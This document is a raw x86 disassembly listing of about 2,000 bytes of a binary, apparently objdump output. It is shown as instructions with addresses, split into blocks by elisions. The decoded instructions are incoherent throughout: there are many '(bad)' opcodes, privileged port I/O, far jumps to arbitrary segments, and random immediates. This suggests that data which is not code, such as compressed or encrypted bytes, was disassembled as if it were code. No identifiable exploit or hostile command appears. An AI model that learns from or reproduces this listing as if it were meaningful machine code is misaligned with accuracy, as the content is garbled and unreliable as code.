  419640:	loop   0x41962c
  419642:	add    BYTE PTR [edx],cl
  419644:	mov    bl,0x5
  419646:	outs   dx,BYTE PTR ds:[esi]
  419647:	inc    esp
  419648:	xor    ebp,DWORD PTR [esi]
  41964a:	sub    ecx,ecx
  41964c:	retf   
  41964d:	imul   ebx,DWORD PTR [edi],0x6b
  419650:	aad    0x32
  419652:	pop    ebx
  419653:	test   BYTE PTR ds:0x2a7f751c,al
  419659:	jb     0x4196ad
  41965b:	push   es
  41965c:	add    DWORD PTR [ebp+0x68f36f31],esi
  419662:	test   esp,esp
  419664:	jnp    0x419699
  419666:	imul   esp,DWORD PTR [eax+0x7a],0x8d6df74a
  41966d:	xor    edi,DWORD PTR [esp+ebx*2]
  419670:	ja     0x4195f2
  419672:	push   ss
  419673:	aas    
  419674:	push   ss
  419675:	mov    ebx,0xa868d768
  41967a:	aam    0xe7
  41967c:	loope  0x419696
  41967e:	rcr    bh,0xd3
  419681:	leave  
  419682:	hlt    
  419683:	mov    esp,0x580f1e5c
  419688:	ds dec edi
  41968a:	push   cs
  41968b:	and    bh,bh
  41968d:	sbb    al,0x7d
  41968f:	outs   dx,DWORD PTR ds:[esi]
  419690:	jle    0x419614
  419692:	sti    
  419693:	or     BYTE PTR [ebx],bl
  419695:	call   ebp
  419697:	push   es
  419698:	rol    BYTE PTR [esi-0x593be42b],1
  41969e:	jb     0x41967b
  4196a0:	mov    ah,0xd0
  4196a2:	pop    esp
  4196a3:	imul   ecx,DWORD PTR [esi-0x22ddb98],0x99fc7991
  4196ad:	jl     0x41971e
  4196af:	mov    ebx,0x8e9290ab
  4196b4:	icebp  
  4196b5:	xor    cl,dl
  4196b7:	out    dx,al
  4196b8:	mov    DWORD PTR [esi],edi
  4196ba:	xor    bl,dl
  4196bc:	js     0x419709
  4196be:	mov    esi,0x52a58a72
  4196c3:	jae    0x419711
  4196c5:	inc    ebx
  4196c6:	inc    esi
  4196c7:	leave  
  4196c8:	sbb    al,BYTE PTR [ecx]
  4196ca:	push   esp
  4196cb:	aam    0x7d
  4196cd:	mov    ds:0xc8163946,eax
  4196d2:	xchg   edx,eax
  4196d3:	cmp    edx,DWORD PTR [ebp+0x71]
  4196d6:	mov    esi,0x611af87f
  4196db:	lea    edx,[ecx-0x19]
  4196de:	push   ds
  4196df:	daa    
  4196e0:	(bad)  
  4196e1:	retf   0x1bc
  4196e4:	or     BYTE PTR [ebx],cl
  4196e6:	dec    eax
  4196e7:	shr    BYTE PTR [edi],1
  4196e9:	xchg   BYTE PTR [eax-0x49efa150],cl
  4196ef:	hlt    
  4196f0:	lahf   
  4196f1:	aaa    
  4196f2:	sbb    eax,0x1fd5c85d
  4196f7:	add    al,0x69
  4196f9:	fcomip st,st(6)
  4196fb:	adc    eax,0x324cf046
  419700:	adc    bh,BYTE PTR [esi+ebp*4-0x13]
  419704:	adc    DWORD PTR [eax+0x5b],0x70b7db25
  41970b:	in     al,0xc9
  41970d:	sbb    DWORD PTR [ebx+edx*2+0xd2],esp
	...
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0xea8dd0ae
  419781:	call   DWORD PTR [eax-0x6e]
  419784:	add    ecx,DWORD PTR [esi]
  419786:	add    DWORD PTR [eax],eax
  419788:	add    eax,0xf6000001
  41978d:	add    al,0x1a
  41978f:	xchg   esp,eax
  419790:	leave  
  419791:	adc    eax,DWORD PTR [ebx]
  419793:	loope  0x41973e
  419795:	ror    BYTE PTR ds:0x355155c6,cl
  41979b:	mov    DWORD PTR [edi+edi*1+0x2c],edx
  41979f:	loope  0x41981c
  4197a1:	cmpxchg ecx,edi
  4197a4:	and    eax,0x4dd6e5b3
  4197a9:	(bad)  
  4197aa:	push   cs
  4197ab:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4197ad:	xor    ebx,DWORD PTR [esi-0x41]
  4197b0:	dec    esi
  4197b1:	repnz lahf 
  4197b3:	mov    dh,0x23
  4197b5:	repz cdq 
  4197b7:	loopne 0x419755
  4197b9:	mov    dh,0x1e
  4197bb:	outs   dx,BYTE PTR ds:[esi]
  4197bc:	sub    eax,0x3bc7e53a
  4197c1:	or     dh,BYTE PTR [ebp+0x6db0fcd8]
  4197c7:	shl    cl,0xa2
  4197ca:	mov    ecx,0x42d673a
  4197cf:	lock jb 0x419811
  4197d2:	jmp    0x4197d5
  4197d4:	in     al,0x53
  4197d6:	gs pop esp
  4197d8:	sbb    BYTE PTR [ecx],dh
  4197da:	loopne 0x4197fb
  4197dc:	add    al,0x1
  4197de:	test   ebp,ebp
  4197e0:	mul    DWORD PTR [ebx]
  4197e2:	scas   eax,DWORD PTR es:[edi]
  4197e3:	xchg   ecx,eax
  4197e4:	icebp  
  4197e5:	add    edx,0x34f26319
  4197eb:	mov    BYTE PTR [esi+0x10],dl
  4197ee:	push   0xffffffb5
  4197f0:	jl     0x419789
  4197f2:	ss aam 0xe0
  4197f5:	std    
  4197f6:	sub    ecx,ebp
  4197f8:	or     eax,esp
  4197fa:	pop    ebx
  4197fb:	dec    ebp
  4197fc:	lahf   
  4197fd:	sbb    DWORD PTR ds:0x57b56e69,0xf453da38
  419807:	dec    esp
  419808:	mov    ch,0xaf
  41980a:	push   ds
  41980b:	sub    eax,0x5f2ddc0f
  419810:	inc    ebp
  419811:	xor    ecx,edi
  419813:	in     eax,dx
  419814:	in     al,dx
  419815:	call   0xc229c586
  41981a:	stos   BYTE PTR es:[edi],al
  41981b:	mov    fs,WORD PTR [ebx]
  41981d:	dec    esi
  41981e:	mov    ebx,0xa6ff7408
  419823:	sub    DWORD PTR [ecx],eax
  419825:	aam    0x9e
  419827:	or     eax,0x4f5ee3f2
  41982c:	inc    edx
  41982d:	jo     0x4197bb
  41982f:	push   edi
  419830:	sbb    bl,BYTE PTR [ebp+0x6b]
  419833:	jg     0x419848
  419835:	fcom   QWORD PTR [edi+0x3b]
  419838:	mov    al,ds:0x569a5fe8
  41983d:	div    BYTE PTR [ecx-0x37f64edc]
  419843:	xor    al,0x20
  419845:	test   BYTE PTR [ebx],0x69
  419848:	inc    ebx
  419849:	or     cl,bh
  41984b:	int    0xa8
  41984d:	ret    
  41984e:	(bad)  
  41984f:	jmp    0x6d15:0x19ba68af
  419856:	push   cs
  419857:	and    eax,esi
  419859:	cld    
  41985a:	loop   0x419828
  41985c:	xor    BYTE PTR [edi+0x9],0x1b
  419860:	int3   
  419861:	push   cs
  419862:	dec    eax
  419863:	xor    al,0xcd
  419865:	jmp    0x153c:0x85a8a2cc
  41986c:	pushf  
  41986d:	les    ebp,FWORD PTR [eax+esi*4]
  419870:	data16 out dx,al
  419872:	add    BYTE PTR [ebp+0x25],al
  419875:	retf   
  419876:	out    0x88,al
  419878:	hlt    
  419879:	clc    
  41987a:	or     ah,bl
  41987c:	(bad)
  41987f:	shl    BYTE PTR [ecx+eiz*1],1
  419882:	cmp    al,0x1d
  419884:	xchg   esp,eax
  419885:	mov    ecx,DWORD PTR [edi+0x7b600d8a]
  41988b:	add    al,0x68
  41988d:	sub    BYTE PTR [edx],ch
  41988f:	adc    DWORD PTR [ecx],0x0
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fst    QWORD PTR [ecx]
  419901:	mov    edx,0xf08ce8d
  419906:	add    DWORD PTR [eax],eax
  419908:	add    eax,0x52000001
  41990d:	in     eax,dx
  41990e:	adc    eax,0x542ff785
  419913:	sub    dl,BYTE PTR [ecx-0xc]
  419916:	or     ch,bh
  419918:	mov    al,BYTE PTR [ebx+eax*1]
  41991b:	ds xchg esi,eax
  41991d:	jae    0x4198ee
  41991f:	sub    dh,BYTE PTR [ebx-0x6a]
  419922:	dec    edx
  419923:	add    ecx,ecx
  419925:	dec    ebp
  419926:	dec    eax
  419927:	(bad)
  41992a:	cmc    
  41992b:	call   0xfecfdd45
  419930:	jmp    0x41992f
  419932:	inc    edx
  419933:	js     0x4198d3
  419935:	mov    cl,0xa2
  419937:	and    BYTE PTR [ebx-0x25],al
  41993a:	sub    eax,0xf17eaf91
  41993f:	xchg   ebp,eax
  419940:	push   ds
  419941:	xor    edx,ebx
  419943:	adc    DWORD PTR [esi+0x58c4c563],ecx
  419949:	pop    ecx
  41994a:	mov    ch,0x27
  41994c:	mov    es:0xae375b50,al
  419952:	push   eax
  419953:	fmul   DWORD PTR [edx-0x3c]
  419956:	mov    ds:0x87d755e5,eax
  41995b:	in     eax,dx
  41995c:	jmp    0x419964
  41995e:	mov    ebp,DWORD PTR [edx+0x4d]
  419961:	pushf  
  419962:	or     eax,0x6efdf60e
  419967:	jecxz  0x41996a
  419969:	dec    edx
  41996a:	repz cmp al,0x46
  41996d:	pop    esi
  41996e:	neg    DWORD PTR [esi]
  419970:	jecxz  0x41995c
  419972:	sub    esi,DWORD PTR [esp+eax*4-0x3]
  419976:	mov    ah,0xdb
  419978:	pushf  
  419979:	les    eax,FWORD PTR [edx]
  41997b:	fnsave [esi+ebx*2]
  41997e:	fadd   DWORD PTR [ebp+0x63]
  419981:	mov    ds:0xc99c0dd7,eax
  419986:	rcr    DWORD PTR [edx-0x1a],0x24
  41998a:	mov    cl,0xc8
  41998c:	xchg   ecx,eax
  41998d:	leave  
  41998e:	outs   dx,DWORD PTR ds:[esi]
  41998f:	add    al,0x72
  419991:	mov    edx,0xf9eadef5
  419996:	jne    0x419999
  419998:	out    0x74,eax
  41999a:	mov    DWORD PTR [esi-0x3abcfe52],esp
  4199a0:	jb     0x419975
  4199a2:	push   ebp
  4199a3:	mov    ds:0xa2a18f6d,al
  4199a8:	std    
  4199a9:	aad    0xf2
  4199ab:	jo     0x41997a
  4199ad:	adc    dh,0x93
  4199b0:	(bad)  
  4199b1:	lock jns 0x419a14
  4199b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199b5:	popa   
  4199b6:	int    0xae
  4199b8:	dec    esp
  4199b9:	enter  0x5bee,0x3
  4199bd:	aaa    
  4199be:	xchg   edx,eax
  4199bf:	jae    0x419a01
  4199c1:	push   eax
  4199c2:	ins    BYTE PTR es:[edi],dx
  4199c3:	inc    BYTE PTR [ecx]
  4199c5:	jnp    0x4199e4
  4199c7:	jb     0x4199b5
  4199c9:	sbb    al,0x49
  4199cb:	aas    
  4199cc:	push   ss
  4199cd:	cmc    
  4199ce:	loopne 0x419a1d
  4199d0:	push   cs
  4199d1:	mov    edi,ss
  4199d3:	ja     0x419a1f
  4199d5:	sar    DWORD PTR ds:0xb816b938,0x4f
  4199dc:	mov    eax,ds:0xbf3ba403
  4199e1:	push   ebx
  4199e2:	repnz dec ebp
  4199e4:	and    eax,0xc8efe9cb
  4199e9:	mov    esp,0x77ca4d8e
  4199ee:	les    ebp,FWORD PTR [ebp-0x1b2a3628]
  4199f4:	xchg   edi,eax
  4199f5:	fisub  WORD PTR [edx+0x72f66540]
  4199fb:	mov    ah,0xb4
  4199fd:	sbb    DWORD PTR [edi-0x5486cab8],0x9862e801
  419a07:	cmp    DWORD PTR [ecx-0x5da97aec],ebp
  419a0d:	es jae 0x419a58
  419a10:	jg     0x419a12
	...
  419a72:	add    BYTE PTR [eax],al
  419a74:	xor    esi,DWORD PTR [ecx]
  419a76:	xchg   ebx,eax
  419a77:	lds    edx,FWORD PTR [ebx-0x34088819]
  419a7d:	rcl    DWORD PTR ds:0x1831e8c2,cl
  419a83:	mov    ebp,0x1100d
  419a88:	add    eax,0x94000001
  419a8d:	int3   
  419a8e:	bound  edi,QWORD PTR [edi]
  419a90:	fidivr WORD PTR [edi-0x64311e3c]
  419a96:	jmp    0xc9a5:0x5c0fdda9
  419a9d:	mov    ebx,cs
  419a9f:	lea    esp,[edi+esi*2]
  419aa2:	(bad)  
  419aa3:	push   edi
  419aa4:	push   ss
  419aa5:	or     eax,0x5dec7ce2
  419aaa:	stos   DWORD PTR es:[edi],eax
  419aab:	adc    ah,dh
  419aad:	and    esp,DWORD PTR [edx-0x5b3a9974]
  419ab3:	xlat   BYTE PTR ds:[ebx]
  419ab4:	bnd je 0x419b1c
  419ab7:	test   al,0x4a
  419ab9:	sub    al,0x40
  419abb:	cli    
  419abc:	inc    ebx
  419abd:	xor    BYTE PTR [ebp-0x5f],bl
  419ac0:	test   al,0xad
  419ac2:	xor    DWORD PTR [ebx],ebx
  419ac4:	cmp    eax,0xed3b1241
  419ac9:	mov    ecx,0xe6ac5f8f
  419ace:	cld    
  419acf:	xor    DWORD PTR [esi-0x63],edx
  419ad2:	cli    
  419ad3:	and    ecx,DWORD PTR [edx]
  419ad5:	ja     0x419a97
  419ad7:	cmc    
  419ad8:	jns    0x419b50
  419ada:	jg     0x419aa0
  419adc:	jg     0x419b45
  419ade:	adc    ah,BYTE PTR [ecx+0x2]
  419ae1:	jb     0x419b38
  419ae3:	sub    bh,BYTE PTR [ecx+0x34]
  419ae6:	jmp    0xcc70f217
  419aeb:	mov    WORD PTR [edi-0x31],cs
  419aee:	dec    esp
  419aef:	sbb    bl,0x3b
  419af2:	inc    ebp
  419af3:	(bad)  
  419af4:	pop    ss
  419af5:	call   0x1692df34
  419afa:	push   DWORD PTR [esi+0x3d51f6e0]
  419b00:	fst    QWORD PTR [edi+0x40]
  419b03:	push   edi
  419b04:	pop    es
  419b05:	mov    esp,0xd66bd918
  419b0a:	inc    esp
  419b0b:	loop   0x419b82
  419b0d:	jmp    0x9532b3a9
  419b12:	cdq    
  419b13:	mov    ds:0x193ddafa,eax
  419b18:	dec    esp
  419b19:	sar    esp,cl
  419b1b:	ds sub esi,edx
  419b1e:	jmp    0x1c30:0xb0c12fd3
  419b25:	pop    ebx
  419b26:	adc    bh,BYTE PTR [esi]
  419b28:	sub    DWORD PTR [esi-0x6adab55d],ebp
  419b2e:	mov    dh,0x8d
  419b30:	ret    
  419b31:	dec    edx
  419b32:	into   
  419b33:	mov    bl,0xc3
  419b35:	mov    esp,ecx
  419b37:	jle    0x419b81
  419b39:	sahf   
  419b3a:	hlt    
  419b3b:	cwde   
  419b3c:	(bad)  
  419b3d:	mov    cl,0x68
  419b3f:	ins    BYTE PTR es:[edi],dx
  419b40:	out    0xc,eax
  419b42:	push   0xdcd9c936
  419b47:	mov    cl,BYTE PTR [ebx+0x295f764]
  419b4d:	xchg   al,cl
  419b4f:	iret   
  419b50:	mov    DWORD PTR [edx+0x653f1d3a],ebx
  419b56:	cmp    al,0x86
  419b58:	out    dx,eax
  419b59:	and    ch,0xb4
  419b5c:	mov    al,0x3b
  419b5e:	pusha  
  419b5f:	jecxz  0x419bb8
  419b61:	sbb    edi,DWORD PTR [ebp-0x2a]
  419b64:	into   
  419b65:	xchg   ebx,eax
  419b66:	cmp    DWORD PTR [eax+esi*2+0x34],edi
  419b6a:	pop    es
  419b6b:	jge    0x419baf
  419b6d:	sbb    ah,BYTE PTR [edx-0x7671ff7c]
  419b73:	ja     0x419b9d
  419b75:	sbb    al,0x46
  419b77:	fimul  WORD PTR ds:0x431f7287
  419b7d:	imul   esi,DWORD PTR [edx+0x311319d7],0x21b50bf0
  419b87:	test   al,0x3f
  419b89:	lods   eax,DWORD PTR ds:[esi]
  419b8a:	fisttp WORD PTR [esp+ebx*1+0xf2c392]
	...
  419bf1:	add    BYTE PTR [eax],al
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0xa8
  419c01:	out    0xce,al
  419c03:	xchg   esp,eax
  419c04:	adc    dl,BYTE PTR [ecx]
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    eax,0x52000001
  419c0d:	mov    eax,ds:0x19f5114
  419c12:	mov    esp,tr6
  419c15:	out    dx,eax
  419c16:	jnp    0x419c32
  419c18:	pop    DWORD PTR [edx+0x20]
  419c1b:	pop    esp
  419c1c:	jmp    0x1d6b78fa
  419c21:	cmp    DWORD PTR [ebp-0x1cad240f],0x2c2d5da6
  419c2b:	jg     0x419c2a
  419c2d:	jp     0x419c51
  419c2f:	push   0x9b60fe4b
  419c34:	adc    ah,dh
  419c36:	rol    BYTE PTR [esi-0x5a],cl
  419c39:	jl     0x419c16
  419c3b:	jge    0x419bec
  419c3d:	rol    DWORD PTR [ecx-0x12],1
  419c40:	or     bl,BYTE PTR [eax]
  419c42:	dec    edi
  419c43:	lock and al,bl
  419c46:	xchg   esp,eax
  419c47:	xor    eax,DWORD PTR [ebp+0x92eb93c]
  419c4d:	cmp    ecx,DWORD PTR [edx-0x80e18db]
  419c53:	inc    eax
  419c54:	scas   eax,DWORD PTR es:[edi]
  419c55:	loopne 0x419c29
  419c57:	push   0xffffffdc
  419c59:	popa   
  419c5a:	sbb    eax,0x9d00809a
  419c5f:	(bad)  [ebp-0xfcbf234]
  419c65:	dec    edi
  419c66:	cmp    DWORD PTR [esi+0x38],0x55
  419c6a:	aas    
  419c6b:	jnp    0x419c03
  419c6d:	fs hlt 
  419c6f:	mov    BYTE PTR [edx],bh
  419c71:	or     DWORD PTR [edi-0x11ec1a99],esp
  419c77:	mov    ch,BYTE PTR [ebx-0x2d]
  419c7a:	hlt    
  419c7b:	dec    esp
  419c7c:	enter  0xb22f,0xb6
  419c80:	inc    edi
  419c81:	mov    esi,ecx
  419c83:	inc    ebx
  419c84:	jmp    0xcfe267a7
  419c89:	les    ebx,FWORD PTR [ecx+ecx*4]
  419c8c:	sar    DWORD PTR [edx-0x73],0x35
  419c90:	xchg   ecx,eax
  419c91:	push   edi
  419c92:	sti    
  419c93:	dec    edx
  419c94:	test   DWORD PTR [ebx],0x437cb81
  419c9a:	arpl   dx,si
  419c9c:	jae    0x419c5d
  419c9e:	lea    esp,[eax+0x331f136b]
  419ca4:	fimul  WORD PTR ds:0x6d24f6c5
  419caa:	fiadd  DWORD PTR [esi]
  419cac:	add    eax,0x21c3320
  419cb1:	into   
  419cb2:	into   
  419cb3:	inc    esp
  419cb4:	mov    WORD PTR [ebp-0x4d],ss
  419cb7:	jo     0xaf5c063
  419cbd:	pop    eax
  419cbe:	outs   dx,DWORD PTR ds:[esi]
  419cbf:	mov    ebp,0x670c97eb
  419cc4:	fld    DWORD PTR [ebx-0x32]
  419cc7:	ficom  WORD PTR [edi]
  419cc9:	(bad)  
  419cca:	(bad)  
  419ccb:	ds loopne 0x419c4f
  419cce:	enter  0x8d2f,0x1f
  419cd2:	xchg   edi,eax
  419cd3:	jmp    FWORD PTR [eax-0x55704b7]
  419cd9:	sbb    al,0x26
  419cdb:	jb     0x419cd5
  419cdd:	mov    ebx,0xcb28d237
  419ce2:	in     eax,dx
  419ce3:	jae    0x419ce8
  419ce5:	push   edi
  419ce6:	rcl    BYTE PTR [edi+0x7602a0ed],0x88
  419ced:	leave  
  419cee:	mov    eax,ds:0xc6326633
  419cf3:	ds inc esi
  419cf5:	sub    cl,al
  419cf7:	xchg   BYTE PTR [edx-0x72f26906],ch
  419cfd:	loopne 0x419cd5
  419cff:	je     0x419c8b
  419d01:	pop    ebx
  419d02:	add    al,BYTE PTR [ecx]
  419d04:	or     al,0xca
  419d06:	inc    esi
  419d07:	in     eax,dx
  419d08:	and    DWORD PTR [ebp-0x5b],edx
  419d0b:	xor    DWORD PTR [esi+0x71ad93a],ebx
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fisub  DWORD PTR ss:[eax]
  419d81:	pop    eax
  419d82:	(bad)  
  419d83:	ret    0x1217
  419d86:	add    DWORD PTR [eax],eax
  419d88:	add    eax,0x88000001
  419d8d:	jns    0x419ddc
  419d8f:	add    al,0x60
  419d91:	fcom   st(0)
  419d93:	jecxz  0x419dfe
  419d95:	or     edi,esi
  419d97:	sbb    eax,0xff7ba3cf
  419d9c:	jae    0x419e01
  419d9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d9f:	stos   DWORD PTR es:[edi],eax
  419da0:	or     esi,DWORD PTR [eax+0x613ea527]
  419da6:	push   es
  419da7:	test   dl,ch
  419da9:	pop    eax
  419daa:	inc    esp
  419dab:	xor    BYTE PTR [esi],bh
  419dad:	xchg   edx,eax
  419dae:	mov    eax,0x5699526f
  419db3:	add    edx,DWORD PTR [ecx-0x80]
  419db6:	shr    BYTE PTR cs:[ebp+0x3a17b05b],1
  419dbd:	popa   
  419dbe:	add    bl,BYTE PTR [ecx+esi*1+0x60]
  419dc2:	sub    eax,0xe8fc475d
  419dc7:	xlat   BYTE PTR ds:[ebx]
  419dc8:	and    dh,bl
  419dca:	sbb    esi,DWORD PTR [edx-0x20]
  419dcd:	(bad)  
  419dce:	xor    BYTE PTR [eax+0x1d],cl
  419dd1:	out    0x6e,al
  419dd3:	cli    
  419dd4:	sub    ch,BYTE PTR ds:0x7905f5
  419dda:	js     0x419d8b
  419ddc:	in     eax,dx
  419ddd:	rcl    DWORD PTR [ecx],cl
  419ddf:	mov    ds:0xf1420233,al
  419de4:	in     eax,dx
  419de5:	icebp  
  419de6:	and    bl,BYTE PTR [esi+0x48]
  419de9:	mov    ecx,0x319ec0d4
  419dee:	xchg   BYTE PTR [edx+ecx*2-0x1e7bc2c0],bl
  419df5:	add    ah,BYTE PTR [ebx]
  419df7:	fadd   st(0),st
  419df9:	in     al,0xa2
  419dfb:	push   ds
  419dfc:	aam    0x80
  419dfe:	adc    DWORD PTR [esi-0x50],ecx
  419e01:	pop    edi
  419e02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e03:	jnp    0x419dae
  419e05:	jle    0x419de9
  419e07:	fidiv  WORD PTR [esi]
  419e09:	mov    esp,0xf08f6c9d
  419e0e:	lea    edx,[ecx+eax*8-0x5a022986]
  419e15:	mov    ebp,0x4583d33e
  419e1a:	mov    ebx,0xed73f847
  419e1f:	jnp    0x419e37
  419e21:	scas   eax,DWORD PTR es:[edi]
  419e22:	mov    ecx,0x6cb68a91
  419e28:	idiv   DWORD PTR [ebp+0x1190cdc4]
  419e2e:	jl     0x419dc8
  419e30:	fisubr DWORD PTR [ecx+ebx*4]
  419e33:	adc    ebx,0x2c178cff
  419e39:	push   ebp
  419e3a:	je     0x419df0
  419e3c:	sbb    ch,BYTE PTR [eax+0x70cba3b9]
  419e42:	addr16 int 0x2b
  419e45:	push   ecx
  419e46:	dec    edi
  419e47:	jo     0x419df3
  419e49:	(bad)  
  419e4b:	out    0xb5,al
  419e4d:	sub    eax,0xab744de6
  419e52:	jecxz  0x419ddd
  419e54:	lods   eax,DWORD PTR ds:[esi]
  419e55:	neg    BYTE PTR ds:0xdea34035
  419e5b:	in     al,dx
  419e5c:	mov    dl,0x51
  419e5e:	mov    ecx,0x8d124353
  419e63:	loopne 0x419eba
  419e65:	jmp    0xabf2:0x936c43c7
  419e6c:	mov    eax,0x8286ed79
  419e71:	lock in al,0xd1
  419e74:	or     ebx,DWORD PTR [eax]
  419e76:	mov    esi,edi
  419e78:	stos   DWORD PTR es:[edi],eax
  419e79:	mov    bl,cl
  419e7b:	(bad)  [ebp+0x134ba15d]
  419e81:	int    0x98
  419e83:	dec    esi
  419e84:	add    bh,ch
  419e86:	xor    al,0xd6
  419e88:	and    al,0x59
  419e8a:	call   DWORD PTR [edx-0x5783b06b]
  419e90:	clc    
	...
  419ef1:	add    BYTE PTR [eax],al
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	addr16 dec esi
  419f02:	dec    esi
  419f03:	sbb    BYTE PTR [ebx+edx*1],0x1
  419f07:	add    BYTE PTR ds:0x90000001,al
  419f0d:	loop   0x419ebc
  419f0f:	xchg   edx,eax
  419f10:	gs jge 0x419eee
  419f13:	xchg   edi,eax
  419f14:	adc    BYTE PTR [ebp-0x30],ch
  419f17:	fistp  DWORD PTR [edi+edx*4+0x54c67796]
  419f1e:	jge    0x419f26
  419f20:	sub    al,0xdd
  419f22:	sbb    eax,edi
  419f24:	test   al,0x4a
  419f26:	call   0xd3f1:0x9bfb7d86
  419f2d:	or     dh,BYTE PTR [edx+0x6c]
  419f30:	sti    
  419f31:	test   al,0xe1
  419f33:	jmp    0x4da4e512
  419f38:	nop
  419f39:	das    
  419f3a:	xor    BYTE PTR [ebp+0x60f76d79],ah
  419f40:	loopne 0x419f94
  419f42:	dec    esp
  419f43:	bound  eax,QWORD PTR [edx]
  419f45:	jp     0x419f37
  419f47:	pusha  
  419f48:	ret    
  419f49:	jmp    0x6066:0xa506ff86
  419f50:	repz jne 0x419f45
  419f53:	and    edx,ebx
  419f55:	jb     0x419ee1
  419f57:	dec    esp
  419f58:	mov    ds:0x37ac1b07,eax
  419f5d:	xchg   esp,eax
  419f5e:	repz sub DWORD PTR [edx],esi
  419f61:	adc    DWORD PTR [ebx+0x51bcd86c],edx
  419f67:	ror    DWORD PTR [ebp+0x5e],1
  419f6a:	es call 0xb732c02e
  419f70:	jo     0x419f8c
  419f72:	dec    edx
  419f73:	and    edi,0xffffffbd
  419f76:	add    BYTE PTR [ebx+0x2],ah
  419f79:	jb     0x419efc
  419f7b:	cwde   
  419f7c:	cmp    al,0x24
  419f7e:	popa   
  419f7f:	outs   dx,BYTE PTR ds:[esi]
  419f80:	cli    
  419f81:	dec    edx
  419f82:	out    dx,al
  419f83:	xlat   BYTE PTR ds:[ebx]
  419f84:	push   0x38af1d61
  419f89:	rep lods eax,DWORD PTR ds:[esi]
  419f8b:	cmp    eax,0x746ba5e3
  419f90:	push   esp
  419f91:	out    0xef,al
  419f93:	dec    DWORD PTR [edx-0x7ea9f4a7]
  419f99:	adc    BYTE PTR [ebx],ch
  419f9b:	lock inc ecx
  419f9d:	add    al,0x16
  419f9f:	je     0x419f41
  419fa1:	jecxz  0x419f28
  419fa3:	fmul   QWORD PTR [ebx+ebx*4-0x3daa10db]
  419faa:	mov    esi,0x77c39f4c
  419faf:	sti    
  419fb0:	inc    ecx
  419fb1:	xchg   esp,eax
  419fb2:	mov    ds:0x65c27dc5,al
  419fb7:	sbb    dl,BYTE PTR [edi-0x41]
  419fba:	loope  0x419fe7
  419fbc:	jp     0x419f93
  419fbe:	mov    ds:0xc9a07606,al
  419fc3:	cmp    eax,edx
  419fc5:	call   0x8c5fe455
  419fca:	pop    ss
  419fcb:	sub    dl,al
  419fcd:	lea    esp,[esi+eax*2+0x8]
  419fd1:	fadd   DWORD PTR [esi-0x29a94a97]
  419fd7:	dec    esp
  419fd8:	mul    BYTE PTR [edx]
  419fda:	pop    ebp
  419fdb:	add    ebx,0x16
  419fde:	ja     0x41a021
  419fe0:	lods   al,BYTE PTR ds:[esi]
  419fe1:	loopne 0x41a034
  419fe3:	pop    es
  419fe4:	fdiv   st(3),st
  419fe6:	hlt    
  419fe7:	shl    DWORD PTR [esp+edi*1-0x4196c7d8],1
  419fee:	in     eax,dx
  419fef:	fcmovne st,st(7)
  419ff1:	loopne 0x41a06c
  419ff3:	outs   dx,DWORD PTR ds:[esi]
  419ff4:	inc    esi
  419ff5:	mov    esp,0xf7b78441
  419ffa:	adc    al,0xc5
  419ffc:	pop    esi
  419ffd:	loop   0x41a00b
  419fff:	xor    bh,bh
  41a001:	push   eax
  41a002:	icebp  
  41a003:	dec    edx
  41a004:	pop    edi
  41a005:	int3   
  41a006:	jmp    0x644146de
  41a00b:	dec    esi
  41a00c:	push   eax
  41a00d:	das    
  41a00e:	jge    0x41a010
  41a010:	push   ecx
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x2d],bh
  41a081:	sub    eax,0x1421c95b
  41a086:	add    DWORD PTR [eax],eax
  41a088:	add    eax,0x92000001
  41a08d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a08e:	mov    ch,0x9
  41a090:	imul   eax,DWORD PTR [edx+0x7b],0xd
  41a094:	les    edx,FWORD PTR [edi-0xc]
  41a097:	mov    ecx,0xbe7200bf
  41a09c:	push   esp
  41a09d:	popf   
  41a09e:	pop    DWORD PTR [ecx+0x2d]
  41a0a1:	mov    ds:0x7c56190,eax
  41a0a6:	into   
  41a0a7:	(bad)  [ecx]
  41a0a9:	push   0xd0954d67
  41a0ae:	stos   BYTE PTR es:[edi],al
  41a0af:	loope  0x41a0c8
  41a0b1:	mov    DWORD PTR [edi+eiz*8-0xf29853b],esi
  41a0b8:	push   ebp
  41a0b9:	in     al,dx
  41a0ba:	ret    0xbd31
  41a0bd:	adc    eax,0xe12718e6
  41a0c2:	mov    eax,0xf140dcb0
  41a0c7:	outs   dx,DWORD PTR ds:[esi]
  41a0c8:	and    DWORD PTR [esi+0x70b15271],edi
  41a0ce:	sbb    dl,BYTE PTR [esi*2-0xcf65384]
  41a0d5:	mov    ah,0x45
  41a0d7:	(bad)  
  41a0d8:	add    al,0xbb
  41a0da:	sbb    BYTE PTR [edi-0x7d],bh
  41a0dd:	(bad)  
  41a0de:	cli    
  41a0df:	add    ch,dh
  41a0e1:	(bad)
  41a0e6:	ds jmp 0x1123:0xc13b2fdb
